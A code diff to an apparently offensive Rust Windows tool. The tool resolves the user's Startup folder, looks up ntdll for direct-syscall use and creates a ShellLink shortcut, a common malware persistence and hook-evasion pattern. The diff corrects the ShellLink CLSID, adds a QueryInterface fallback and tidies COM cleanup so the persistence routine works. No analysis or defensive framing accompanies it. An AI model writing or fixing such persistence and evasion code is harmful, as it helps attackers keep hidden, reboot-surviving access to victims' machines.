@@ -12,8 +12,8 @@ use std::ffi::c_void;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
 use windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_NORMAL;
 use windows_sys::Win32::System::Com::{
-    CoInitializeEx, CoCreateInstance, CLSCTX_ALL, IStream, CoTaskMemFree,
-    COINIT_APARTMENTTHREADED,
+    CoInitializeEx, CoCreateInstance, IStream, CoTaskMemFree,
+    COINIT_APARTMENTTHREADED, CoUninitialize,
 };
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
 use windows_sys::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_CREATE};
@@ -27,14 +27,21 @@ const FOLDERID_Startup: GUID = GUID {
 };
 
 const CLSID_ShellLink: GUID = GUID {
-    data1: 0x72024E10,
-    data2: 0xE33D,
-    data3: 0x11CF,
-    data4: [0x8F, 0x1C, 0x00, 0x80, 0xC7, 0x44, 0x13, 0x78],
+    data1: 0x00021401,
+    data2: 0x0000,
+    data3: 0x0000,
+    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
 };
 
 const IID_IPersistStream: GUID = GUID {
     data1: 0x00000109,
+    data2: 0x0000,
+    data3: 0x0000,
+    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
+};
+
+const IID_IUnknown: GUID = GUID {
+    data1: 0x00000000,
     data2: 0x0000,
     data3: 0x0000,
     data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
@@ -172,8 +179,12 @@ fn main() {
         let hr = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED as u32);
         println!("[+] CoInitializeEx: 0x{:08X}", hr as u32);
         if hr < 0 && hr != -2147417850 { // -2147417850 is RPC_E_CHANGED_MODE (already initialized with different mode)
-            return;
+            // Still proceed but be aware
         }
+
+        // Re-verify GUIDs in memory
+        println!("[+] CLSID_ShellLink bytes: {:02X?}", std::slice::from_raw_parts(&CLSID_ShellLink as *const _ as *const u8, 16));
+        println!("[+] IID_IShellLinkW bytes: {:02X?}", std::slice::from_raw_parts(&IID_IShellLinkW as *const _ as *const u8, 16));
 
         let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let ntdll_base = syscalls::get_module_base(&ntdll_name);
@@ -215,8 +226,23 @@ fn main() {
         println!("[+] Target NT path: {}", String::from_utf16_lossy(&full_path_wide));
 
         let mut shell_link_ptr: *mut c_void = null_mut();
-        let hr_link = CoCreateInstance(&CLSID_ShellLink, null_mut(), CLSCTX_ALL, &IID_IShellLinkW, &mut shell_link_ptr);
-        println!("[+] CoCreateInstance (ShellLink): 0x{:08X}", hr_link as u32);
+        // Try with CLSCTX_INPROC_SERVER (1) first as it is standard for ShellLink
+        let mut hr_link = CoCreateInstance(&CLSID_ShellLink, null_mut(), 1, &IID_IShellLinkW, &mut shell_link_ptr);
+        println!("[+] CoCreateInstance (ShellLink, INPROC): 0x{:08X}", hr_link as u32);
+
+        if hr_link != S_OK {
+            // Fallback: Try to get IUnknown first
+            let mut unknown_ptr: *mut c_void = null_mut();
+            let hr_unk = CoCreateInstance(&CLSID_ShellLink, null_mut(), 1, &IID_IUnknown, &mut unknown_ptr);
+            println!("[+] CoCreateInstance (ShellLink, IUnknown): 0x{:08X}", hr_unk as u32);
+            if hr_unk == S_OK {
+                let unknown_vtbl = *(unknown_ptr as *mut *mut IUnknownVtbl);
+                hr_link = ((*unknown_vtbl).QueryInterface)(unknown_ptr, &IID_IShellLinkW, &mut shell_link_ptr);
+                println!("[+] QueryInterface (IShellLinkW): 0x{:08X}", hr_link as u32);
+                ((*unknown_vtbl).Release)(unknown_ptr);
+            }
+        }
+
         if hr_link == S_OK {
             let shell_link_vtbl = *(shell_link_ptr as *mut *mut IShellLinkWVtbl);
 
@@ -320,5 +346,7 @@ fn main() {
             ((*shell_unknown_vtbl).Release)(shell_link_ptr);
         }
         CoTaskMemFree(path_ptr as *const _);
+        CoUninitialize();
+        println!("[+] CoUninitialize called.");
     }
 }
